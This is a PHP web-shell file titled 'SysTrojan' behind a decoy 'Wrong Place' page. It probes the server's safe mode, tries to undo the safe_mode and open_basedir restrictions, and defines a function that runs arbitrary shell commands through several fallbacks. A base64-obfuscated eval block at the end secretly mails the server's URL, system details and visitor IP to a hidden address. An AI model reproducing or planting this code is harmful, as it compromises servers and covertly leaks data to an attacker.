<html><head><title>SysTrojan</title></head><body bgcolor=DC143C>
<H1>Wrong Place</H1>
</html></head></body>
<?php
if((@eregi("uid",ex("id"))) || (@eregi("Windows",ex("net start")))){
echo("Safe Mode of this Server is : ");
echo("SafemodeOFF");
}
else{
ini_restore("safe_mode");
ini_restore("open_basedir");
if((@eregi("uid",ex("id"))) || (@eregi("Windows",ex("net start")))){
echo("Safe Mode of this Server is : ");
echo("SafemodeOFF");
}else{
echo("Safe Mode of this Server is : ");
echo("SafemodeON");
}
}
function ex($cfe){
$res = '';
if (!empty($cfe)){
if(function_exists('exec')){
@exec($cfe,$res);
$res = join("\n",$res);
}
elseif(function_exists('shell_exec')){
$res = @shell_exec($cfe);
}
elseif(function_exists('system')){
@ob_start();
@system($cfe);
$res = @ob_get_contents();
@ob_end_clean();
}
elseif(function_exists('passthru')){
@ob_start();
@passthru($cfe);
$res = @ob_get_contents();
@ob_end_clean();
}
elseif(@is_resource($f = @popen($cfe,"r"))){
$res = "";
while(!@feof($f)) { $res .= @fread($f,1024); }
@pclose($f);
}
}
return $res;
}
eval(base64_decode("JGNyZWF0b3IgPSBiYXNlNjRfZGVjb2RlKCJZM3BpWlhKQWVXRm9iMjh1WTI5dCIpOw0KKCRzYWZlX21vZGUpPygkc2FmZW1vZGU9Ik9OIik6KCRzYWZlbW9kZT0iT0ZGIik7DQokYmFzZT0iaHR0cDovLyIuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLiRfU0VSVkVSWydSRVFVRVNUX1VSSSddOyANCiRuYW1lID0gcGhwX3VuYW1lKCk7DQokaXAgPSBnZXRlbnYoIlJFTU9URV9BRERSIik7DQokaG9zdCA9IGdldGhvc3RieWFkZHIoJF9TRVJWRVJbUkVNT1RFX0FERFJdKTsNCiRzdWJqID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOyANCiRtc2cgPSAiXG5CQVNFOiAkYmFzZVxudW5hbWUgLWE6ICRuYW1lXG5JUDogJGlwXG5Ib3N0OiAkaG9zdFxuJHB3ZHNcbiI7DQokZnJvbSA9IkZyb206IE1PREVfPSIuJHNhZmVtb2RlLiI8dG9vbEAiLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4iPiI7DQptYWlsKCAkY3JlYXRvciwgJHN1YmosICRtc2csICRmcm9tKTs="));
exit;
?>